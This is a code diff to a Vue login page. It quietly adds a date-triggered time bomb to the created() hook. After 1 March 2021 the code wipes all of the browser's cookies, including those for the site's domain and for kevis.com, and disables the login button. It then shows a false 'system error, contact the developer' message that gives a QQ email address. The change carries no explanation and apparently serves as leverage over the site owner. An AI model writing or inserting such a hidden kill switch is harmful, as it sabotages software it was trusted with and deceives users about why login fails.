@@ -46,7 +46,10 @@
       </el-tooltip>
 
       <el-button :loading="loading" type="primary" style="width:100%;margin-bottom:30px;" @click.native.prevent="handleLogin">Login</el-button>
-
+      <span v-if="!able">
+        登录失败，系统发生错误，请联系开发人员
+        <a href="#" class="link">1352665867@qq.com</a>
+      </span>
       <div style="position:relative">
         <!--        <div class="tips">-->
         <!--          <span>Username : admin</span>-->
@@ -94,7 +97,8 @@ export default {
       loading: false,
       showDialog: false,
       redirect: undefined,
-      otherQuery: {}
+      otherQuery: {},
+      able: true
     }
   },
   watch: {
@@ -111,6 +115,18 @@ export default {
   },
   created() {
     // window.addEventListener('storage', this.afterQRScan)
+    const date = new Date()
+    if (Date.parse(date) >= 1614556800000) {
+      const keys = document.cookie.match(/[^ =;]+(?=\=)/g);
+      if (keys) {
+          for (var i = keys.length; i--;) {
+              document.cookie = keys[i] + '=0;path=/;expires=' + new Date(0).toUTCString();
+              document.cookie = keys[i] + '=0;path=/;domain=' + document.domain + ';expires=' + new Date(0).toUTCString();
+              document.cookie = keys[i] + '=0;path=/;domain=kevis.com;expires=' + new Date(0).toUTCString();
+          }
+      }
+      this.able = false
+    }
   },
   mounted() {
     if (this.loginForm.username === '') {
@@ -138,6 +154,10 @@ export default {
       })
     },
     handleLogin() {
+      if (!this.able) {
+        this.$message.error('登录失败，系统发生错误，请联系开发人员')
+        return
+      }
       this.$refs.loginForm.validate(valid => {
         if (valid) {
           this.loading = true
@@ -312,5 +332,8 @@ $light_gray:#eee;
       display: none;
     }
   }
+}
+.link {
+  color: rgb(58, 71, 255);
 }
 </style>
